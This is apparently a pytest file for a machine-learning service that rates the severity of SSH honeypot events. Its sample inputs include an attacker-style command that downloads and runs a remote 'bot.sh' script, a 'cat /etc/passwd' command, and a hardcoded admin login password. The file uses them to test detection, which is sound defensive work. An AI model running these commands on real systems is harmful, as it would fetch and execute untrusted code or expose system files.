import pytest
from app.ml.trainer import train_models, get_latest_metrics
from app.ml.predictor import predict_single_event
from conftest import TestingSessionLocal

def get_admin_token(client):
    login_res = client.post("/api/v1/auth/login", data={"username": "admin", "password": "Admin@Cyvantis2026!"})
    return login_res.json()["access_token"]

def test_ml_training_and_metrics():
    db = TestingSessionLocal()
    try:
        res = train_models(db=db)
        assert res["success"] is True
        assert "metrics" in res
        metrics = res["metrics"]
        assert metrics["status"] == "TRAINED"
        assert metrics["total_samples"] > 0
        assert 0.0 <= metrics["accuracy"] <= 1.0
        assert "severity_classifier.joblib" in metrics["saved_artifacts"]["classifier"]

        latest = get_latest_metrics()
        assert latest["status"] == "TRAINED"
    finally:
        db.close()

def test_ml_prediction_inference():
    db = TestingSessionLocal()
    try:
        train_models(db=db)
    finally:
        db.close()

    payload = {
        "eventid": "cowrie.command.input",
        "protocol": "SSH",
        "dst_port": 22,
        "username": "root",
        "password": "123456",
        "command": "wget http://192.168.1.50/bot.sh; chmod +x bot.sh; ./bot.sh",
        "duration": 15.0
    }

    pred = predict_single_event(payload)
    assert pred["model_status"] == "TRAINED"
    assert pred["predicted_severity"] in ["low", "medium", "high", "critical"]
    assert 0.0 <= pred["confidence"] <= 1.0
    assert isinstance(pred["is_anomalous"], bool)

def test_ml_api_endpoints(client):
    token = get_admin_token(client)
    headers = {"Authorization": f"Bearer {token}"}

    # GET /api/v1/ml/metrics
    res = client.get("/api/v1/ml/metrics")
    assert res.status_code == 200

    # POST /api/v1/ml/train
    train_res = client.post("/api/v1/ml/train", headers=headers)
    assert train_res.status_code == 200
    assert train_res.json()["success"] is True

    # POST /api/v1/ml/predict
    pred_res = client.post("/api/v1/ml/predict", json={
        "command": "cat /etc/passwd",
        "username": "admin",
        "protocol": "SSH"
    })
    assert pred_res.status_code == 200
    assert "predicted_severity" in pred_res.json()
